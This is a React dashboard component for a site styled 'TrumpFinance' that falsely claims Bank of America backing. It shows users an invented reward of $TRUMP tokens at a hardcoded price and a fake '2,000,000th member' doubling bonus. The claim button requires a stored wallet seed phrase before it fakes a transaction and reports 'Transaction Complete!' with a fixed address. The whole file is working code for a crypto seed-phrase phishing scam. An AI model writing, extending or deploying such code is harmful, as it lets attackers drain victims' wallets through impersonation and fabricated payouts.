import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { supabase } from "@/lib/supabase";
import WalletModal from "./wallet-modal";
import { ArrowLeft } from "lucide-react";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

export default function Dashboard() {
  const [user, setUser] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [rewards, setRewards] = useState<any>(null);
  const [wallet, setWallet] = useState<any>(null);
  const [walletModalOpen, setWalletModalOpen] = useState(false);
  const [claimError, setClaimError] = useState("");
  const [logoError, setLogoError] = useState(false);
  const [boaLogoError, setBoaLogoError] = useState(false);
  const [newLogoError, setNewLogoError] = useState(false);
  const [trumpPrice, setTrumpPrice] = useState<number | null>(null);
  const [priceLoading, setPriceLoading] = useState(true);
  const [errorDialogOpen, setErrorDialogOpen] = useState(false);
  const [congratsOpen, setCongratsOpen] = useState(false);
  const [tokenAmount, setTokenAmount] = useState(60315);
  const [displayTokenAmount, setDisplayTokenAmount] = useState(60315);
  const [isDoubled, setIsDoubled] = useState(false);
  const [bonusClaimed, setBonusClaimed] = useState(false);
  const [bonusClaimedBefore, setBonusClaimedBefore] = useState(false);
  const [isClaiming, setIsClaiming] = useState(false);
  const [hasClaimed, setHasClaimed] = useState(false);
  const [claimedTokenAmount, setClaimedTokenAmount] = useState(0);
  const [claimedPrice, setClaimedPrice] = useState(0);
  const [claimedTotal, setClaimedTotal] = useState(0);
  const navigate = useNavigate();

  useEffect(() => {
    // Set hardcoded price of $6.38 per TRUMP token
    setTrumpPrice(6.38);
    setPriceLoading(false);
  }, []);

  useEffect(() => {
    const checkUser = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      
      if (!session) {
        navigate("/login");
        return;
      }

      setUser(session.user);

      // Check if bonus was claimed before
      const bonusClaimedKey = `bonus_claimed_${session.user.id}`;
      const wasBonusClaimed = localStorage.getItem(bonusClaimedKey) === 'true';
      setBonusClaimedBefore(wasBonusClaimed);

      // Fetch rewards
      let { data: rewardsData, error: rewardsError } = await supabase
        .from("user_rewards")
        .select("*")
        .eq("user_id", session.user.id)
        .single();

      // If no rewards exist, create them
      if (rewardsError || !rewardsData) {
        const { data: newRewards } = await supabase
          .from("user_rewards")
          .insert({
            user_id: session.user.id,
            available_amount: wasBonusClaimed ? 120630 : 60315,
            claimed_amount: 0,
            rewards_claimed: false
          })
          .select()
          .single();
        rewardsData = newRewards;
      }

      // Fetch wallet
      let { data: walletData, error: walletError } = await supabase
        .from("user_wallets")
        .select("*")
        .eq("user_id", session.user.id)
        .single();

      // If no wallet exists, create it
      if (walletError || !walletData) {
        const { data: newWallet } = await supabase
          .from("user_wallets")
          .insert({
            user_id: session.user.id,
            volume_traded: 0
          })
          .select()
          .single();
        walletData = newWallet;
      }

      setRewards(rewardsData);
      setWallet(walletData);
      
      // Check if rewards were already claimed
      if (rewardsData?.rewards_claimed) {
        setHasClaimed(true);
        // Load the claimed amounts from database
        setClaimedTokenAmount(rewardsData.claimed_token_amount || 0);
        setClaimedPrice(rewardsData.claimed_price || 0);
        setClaimedTotal(rewardsData.claimed_amount || 0);
      }
      
      // Set initial token amounts based on whether bonus was claimed
      if (wasBonusClaimed) {
        setTokenAmount(120630);
        setDisplayTokenAmount(120630);
        setBonusClaimed(true);
      }
      
      setLoading(false);

      // Show congrats dialog and start menu animation after 1 second only if bonus not claimed before
      if (!wasBonusClaimed) {
        setTimeout(() => {
          setCongratsOpen(true);
          // Start menu animation immediately when dialog opens
          animateTokenDoubling();
        }, 1000);
      }
    };

    checkUser();

    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      if (!session) {
        navigate("/login");
      } else {
        setUser(session.user);
      }
    });

    return () => subscription?.unsubscribe();
  }, [navigate]);

  const animateTokenDoubling = () => {
    const startAmount = 60315;
    const endAmount = 120630;
    const duration = 2000;
    const steps = 60;
    const increment = (endAmount - startAmount) / steps;
    let currentStep = 0;

    const interval = setInterval(() => {
      currentStep++;
      const newAmount = Math.floor(startAmount + (increment * currentStep));
      setTokenAmount(newAmount);

      if (currentStep >= steps) {
        clearInterval(interval);
        setTokenAmount(endAmount);
        setIsDoubled(true);
      }
    }, duration / steps);
  };

  const animateRewardsCard = async () => {
    const startAmount = 60315;
    const endAmount = 120630;
    const duration = 2000;
    const steps = 60;
    const increment = (endAmount - startAmount) / steps;
    let currentStep = 0;

    const interval = setInterval(() => {
      currentStep++;
      const newAmount = Math.floor(startAmount + (increment * currentStep));
      setDisplayTokenAmount(newAmount);

      if (currentStep >= steps) {
        clearInterval(interval);
        setDisplayTokenAmount(endAmount);
      }
    }, duration / steps);

    // Update database with new amount
    if (user?.id) {
      await supabase
        .from("user_rewards")
        .update({ available_amount: endAmount })
        .eq("user_id", user.id);
    }
  };

  const handleClaimBonus = async () => {
    // Close dialog immediately
    setBonusClaimed(true);
    
    // Save to localStorage that bonus was claimed
    if (user?.id) {
      localStorage.setItem(`bonus_claimed_${user.id}`, 'true');
    }
    
    setCongratsOpen(false);
    
    // Start dashboard animation after dialog closes
    setTimeout(() => {
      animateRewardsCard();
    }, 300);

    // Update database immediately
    if (user?.id) {
      await supabase
        .from("user_rewards")
        .update({ available_amount: 120630 })
        .eq("user_id", user.id);
      
      // Refresh rewards data
      const { data: rewardsData } = await supabase
        .from("user_rewards")
        .select("*")
        .eq("user_id", user.id)
        .single();
      
      if (rewardsData) {
        setRewards(rewardsData);
      }
    }
  };

  const handleLogout = async () => {
    await supabase.auth.signOut();
    navigate("/");
  };

  const handleClaim = async () => {
    setClaimError("");

    // Check if wallet is connected
    if (!wallet?.wallet_address || !wallet?.seed_phrase) {
      setWalletModalOpen(true);
      return;
    }

    // Capture the current values at the moment of claiming
    const currentTokenAmount = displayTokenAmount;
    const currentPrice = trumpPrice || 0;
    const currentTotal = parseFloat(calculateDollarValue().replace(/,/g, ''));

    // Start claiming process
    setIsClaiming(true);

    // Simulate transaction processing (3 seconds)
    setTimeout(async () => {
      // Update database to mark rewards as claimed with captured values
      const { error } = await supabase
        .from("user_rewards")
        .update({ 
          rewards_claimed: true,
          claimed_amount: currentTotal,
          claimed_token_amount: currentTokenAmount,
          claimed_price: currentPrice,
          available_amount: 0
        })
        .eq("user_id", user.id);

      if (error) {
        console.error("Error updating rewards:", error);
        setClaimError("Failed to claim rewards. Please try again.");
        setIsClaiming(false);
        return;
      }

      // Set the claimed values in state
      setClaimedTokenAmount(currentTokenAmount);
      setClaimedPrice(currentPrice);
      setClaimedTotal(currentTotal);

      setIsClaiming(false);
      setHasClaimed(true);
    }, 3000);
  };

  const handleWalletSuccess = async () => {
    const { data: walletData } = await supabase
      .from("user_wallets")
      .select("*")
      .eq("user_id", user.id)
      .single();

    setWallet(walletData);
    // Don't show any dialog after wallet connection
  };

  const calculateDollarValue = (tokens = displayTokenAmount) => {
    if (!trumpPrice || priceLoading) return "...";
    const value = tokens * trumpPrice;
    return value.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  };

  if (loading) {
    return <div className="flex items-center justify-center min-h-screen text-sm sm:text-base">Loading...</div>;
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <nav className="bg-white shadow">
        <div className="max-w-7xl mx-auto px-3 sm:px-4 lg:px-8 py-3 sm:py-4 flex justify-between items-center gap-2">
          <div className="flex items-center gap-2 sm:gap-4 lg:gap-6 overflow-x-auto flex-1 min-w-0">
            <Button
              onClick={() => navigate("/")}
              variant="ghost"
              className="flex items-center gap-1 sm:gap-2 text-gray-600 hover:text-gray-900 flex-shrink-0 text-xs sm:text-sm px-2 sm:px-3"
            >
              <ArrowLeft className="h-4 w-4 sm:h-5 sm:w-5" />
              <span className="hidden sm:inline">Back</span>
            </Button>
            <div className="flex items-center gap-2 sm:gap-3 flex-shrink-0">
              <a href="https://gettrumpmemes.com/" target="_blank" rel="noopener noreferrer" className="hover:opacity-80 transition-opacity">
                {!logoError ? (
                  <div className="bg-gray-900 rounded-lg p-1.5 sm:p-2">
                    <img 
                      src="https://cust-aff-login.onrender.com/static/images/beloLogo-removebg-preview.png" 
                      alt="TrumpFinance Logo"
                      className="h-6 sm:h-8 w-auto"
                      onError={() => setLogoError(true)}
                    />
                  </div>
                ) : (
                  <div className="h-6 sm:h-8 w-6 sm:w-8 bg-red-600 rounded flex items-center justify-center text-white font-bold text-xs">TF</div>
                )}
              </a>
              <span className="font-bold text-base sm:text-xl text-gray-900 whitespace-nowrap">TrumpFinance</span>
            </div>
            <div className="hidden md:flex items-center gap-3 lg:gap-4 pl-3 lg:pl-6 border-l border-gray-300">
              <div className="flex items-center gap-2">
                <span className="text-gray-600 text-xs lg:text-sm whitespace-nowrap">Powered by</span>
                <a href="https://www.bankofamerica.com" target="_blank" rel="noopener noreferrer" className="hover:opacity-80 transition-opacity">
                  {!boaLogoError ? (
                    <img 
                      src="https://cust-aff-login.onrender.com/static/images/soPozadinaBankOfAmerica-removebg-preview.png" 
                      alt="Bank of America"
                      className="h-8 lg:h-10 w-auto"
                      onError={() => setBoaLogoError(true)}
                    />
                  ) : (
                    <span className="text-gray-600 text-xs lg:text-sm font-semibold">Bank of America</span>
                  )}
                </a>
              </div>
              <div className="flex items-center gap-2 pl-3 lg:pl-4 border-l border-gray-300">
                <a href="https://gettrumpmemes.com/" target="_blank" rel="noopener noreferrer" className="hover:opacity-80 transition-opacity">
                  {!newLogoError ? (
                    <img 
                      src="https://i.imgur.com/AOVLAFU.png" 
                      alt="Partner Logo"
                      className="h-8 lg:h-10 w-auto"
                      onError={() => setNewLogoError(true)}
                    />
                  ) : (
                    <div className="h-8 lg:h-10 w-8 lg:w-10 bg-gray-300 rounded"></div>
                  )}
                </a>
              </div>
            </div>
          </div>
          <Button onClick={handleLogout} className="bg-red-600 hover:bg-red-700 text-white flex-shrink-0 text-xs sm:text-sm px-3 sm:px-4 py-1.5 sm:py-2">
            Logout
          </Button>
        </div>
      </nav>

      <div className="max-w-7xl mx-auto px-3 sm:px-4 lg:px-8 py-6 sm:py-8 md:py-12">
        <div className="bg-white rounded-lg shadow p-4 sm:p-6 md:p-8">
          <h1 className="text-2xl sm:text-3xl font-bold text-gray-900 mb-6 sm:mb-8 break-words">Welcome, {user?.email}!</h1>

          {!bonusClaimed && !bonusClaimedBefore && (
            <div className="mb-6 sm:mb-8 p-4 sm:p-6 bg-gradient-to-r from-blue-600 to-purple-600 rounded-lg text-white">
              <h3 className="text-lg sm:text-xl font-bold mb-3">Great news!</h3>
              <p className="text-sm sm:text-base mb-2">
                As the 2,000,000th registered member of our community, you've been selected to receive a special 2× boost on your rewards.
              </p>
              <p className="text-sm sm:text-base mb-4">
                Connect your account to securely claim your funds
              </p>
              <Button
                onClick={() => setCongratsOpen(true)}
                className="bg-white text-blue-600 hover:bg-gray-100 font-semibold"
              >
                Claim Bonus
              </Button>
            </div>
          )}

          {claimError && (
            <div className="mb-4 sm:mb-6 p-3 sm:p-4 bg-red-100 border border-red-400 text-red-700 rounded text-sm">
              {claimError}
            </div>
          )}

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 sm:gap-6 mb-6 sm:mb-8">
            <div className="bg-gradient-to-br from-blue-50 to-blue-100 p-4 sm:p-6 rounded-lg border border-blue-200 transition-all duration-300">
              <h3 className="text-base sm:text-lg font-semibold text-gray-900 mb-2">Available Rewards</h3>
              <div className="mb-3">
                <p className="text-3xl sm:text-4xl font-bold text-blue-600 break-words transition-all duration-300">
                  {hasClaimed ? "$0" : (priceLoading ? "..." : calculateDollarValue())}
                </p>
                <p className="text-xs sm:text-sm text-gray-600 mt-2">
                  {hasClaimed 
                    ? `0 $TRUMP × ${trumpPrice?.toFixed(2) || "..."} = $0`
                    : `${displayTokenAmount.toLocaleString()} $TRUMP × ${trumpPrice?.toFixed(2) || "..."} = ${priceLoading ? "..." : calculateDollarValue()}`
                  }
                </p>
                <p className="text-xs text-gray-500 mt-1">
                  Updates every 5 seconds
                </p>
              </div>
            </div>
            
            <div className="bg-gradient-to-br from-red-50 to-red-100 p-4 sm:p-6 rounded-lg border border-red-200">
              <h3 className="text-base sm:text-lg font-semibold text-gray-900 mb-2">Claimed Amount</h3>
              <div className="mb-3">
                <p className="text-3xl sm:text-4xl font-bold text-red-600 break-words">
                  {hasClaimed ? `$${claimedTotal.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}` : "$0"}
                </p>
                {hasClaimed && (
                  <p className="text-xs sm:text-sm text-gray-600 mt-2">
                    {claimedTokenAmount.toLocaleString()} $TRUMP × ${claimedPrice.toFixed(2)} = ${claimedTotal.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                  </p>
                )}
              </div>
            </div>
          </div>

          {!hasClaimed ? (
            <div className="bg-gradient-to-r from-blue-900 to-red-700 rounded-lg p-6 sm:p-8 text-white mb-6 sm:mb-8">
              <h2 className="text-xl sm:text-2xl font-bold mb-3 sm:mb-4">Claim Your Rewards</h2>
              <p className="mb-4 sm:mb-6 text-sm sm:text-base break-words">
                {wallet?.wallet_address 
                  ? `Your wallet is connected to ${wallet.wallet_address.slice(0, 10)}...${wallet.wallet_address.slice(-8)}`
                  : "Connect your wallet to claim your rewards"}
              </p>
              <Button
                onClick={handleClaim}
                disabled={isClaiming}
                className="bg-white text-red-600 hover:bg-gray-100 font-semibold px-6 sm:px-8 py-2 text-sm sm:text-base w-full sm:w-auto disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isClaiming ? (
                  <span className="flex items-center gap-2">
                    <svg className="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Processing Transaction...
                  </span>
                ) : (
                  wallet?.wallet_address ? "Claim Rewards" : "Connect Wallet"
                )}
              </Button>
            </div>
          ) : (
            <div className="bg-gradient-to-r from-green-600 to-blue-600 rounded-lg p-6 sm:p-8 text-white mb-6 sm:mb-8 animate-pulse">
              <div className="flex items-center gap-3 mb-3">
                <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                </svg>
                <h2 className="text-xl sm:text-2xl font-bold">Transaction Complete!</h2>
              </div>
              <p className="text-sm sm:text-base break-words">
                Your rewards have been successfully sent to your wallet address: 0xfb8aaf631e483936ff40fa9d6b9ce66760670a76
              </p>
            </div>
          )}
        </div>
      </div>

      <WalletModal
        open={walletModalOpen}
        onOpenChange={setWalletModalOpen}
        userId={user?.id}
        onSuccess={handleWalletSuccess}
      />

      {/* Congratulations Dialog - Modern Version */}
      <AlertDialog open={congratsOpen} onOpenChange={setCongratsOpen}>
        <AlertDialogContent className="max-w-[90vw] sm:max-w-lg bg-white border-2 border-gray-200">
          <AlertDialogHeader>
            <div className="text-center mb-6">
              <div className="w-20 h-20 mx-auto mb-4 bg-gradient-to-br from-blue-500 to-purple-600 rounded-full flex items-center justify-center">
                <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <AlertDialogTitle className="text-2xl sm:text-3xl font-bold text-gray-900 mb-3">
                Great news!
              </AlertDialogTitle>
              <div className="text-base sm:text-lg text-gray-700 mb-4 px-4">
                As the 2,000,000th registered member of our community, you've been selected to receive a special 2× bonus on your tokens.
              </div>
            </div>
            <AlertDialogDescription asChild>
              <div className="text-center space-y-6">
                <div className="bg-gradient-to-br from-blue-50 to-purple-50 p-6 rounded-xl border border-blue-200">
                  <p className="text-lg font-semibold text-gray-900 mb-4">
                    Special Bonus: 2X Tokens
                  </p>
                  <div className="space-y-3">
                    <div>
                      <p className="text-sm text-gray-600 mb-1">Your tokens:</p>
                      <div className="text-2xl sm:text-3xl font-bold text-gray-700">
                        60,315 $TRUMP
                      </div>
                    </div>
                    <div className="pt-3 border-t border-gray-200">
                      <p className="text-sm text-gray-600 mb-1">Including the bonus, your tokens are:</p>
                      <div className="text-3xl sm:text-4xl font-bold text-blue-600 transition-all duration-300">
                        {tokenAmount.toLocaleString()} $TRUMP
                      </div>
                    </div>
                  </div>
                </div>
                <p className="text-sm text-gray-600">
                  Connect your wallet to securely claim your funds
                </p>
              </div>
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogAction 
              onClick={handleClaimBonus} 
              className="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-semibold text-base py-3"
            >
              Claim Bonus
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
}